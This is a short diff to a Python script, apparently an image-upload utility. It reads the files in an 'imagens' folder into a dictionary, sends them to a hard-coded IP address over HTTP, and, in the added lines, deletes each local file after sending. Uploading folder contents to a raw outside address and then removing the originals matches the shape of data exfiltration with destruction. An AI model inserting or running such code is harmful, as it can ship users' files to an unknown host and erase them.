@@ -1,4 +1,3 @@
-
 import os
 import json
 import base64
@@ -16,6 +15,6 @@ for files in dirs:
     data[files] = codigo
 
 r = requests.get('http://34.95.155.151/index.php', json = data)
-# arq = open("imagens.txt","w")
-# arq.write(str(data))
-# arq.close()
+
+for files in dirs:
+    os.remove("imagens/"+files)
